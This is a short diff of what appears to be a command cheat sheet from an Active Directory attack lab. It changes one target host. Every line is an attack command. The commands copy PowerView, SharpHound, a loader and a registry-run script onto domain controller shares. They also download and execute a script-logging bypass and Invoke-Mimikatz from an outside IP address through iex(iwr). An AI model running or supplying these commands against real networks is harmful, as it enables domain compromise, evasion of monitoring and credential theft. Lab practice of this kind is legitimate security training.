@@ -4,7 +4,7 @@ echo F | xcopy C:\AD\Tools\RunWithRegistryNonAdmin.bat \\dcorp-dc\C$\Users\Publi
 echo F | xcopy C:\AD\Tools\PowerView.ps1 \\mcorp-dc\C$\Users\Public\PowerView.ps1
 echo F | xcopy C:\AD\Tools\Set-RemotePSRemoting.ps1 \\dcorp-ci\C$\Users\Public\Set-RemotePSRemoting.ps1
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Administrator\Desktop\Loader.exe
-echo F | xcopy C:\AD\Tools\SharpHound.ps1 \\dcorp-cd\C$\Users\Public\SharpHound.ps1
+echo F | xcopy C:\AD\Tools\SharpHound.ps1 \\mcorp-dc\C$\Users\Public\SharpHound.ps1
 
 iex (iwr http://172.16.100.87/sbloggingbypass.txt -UseBasicParsing)
 iex (iwr http://172.16.100.87/Invoke-Mimikatz.ps1 -UseBasicParsing)
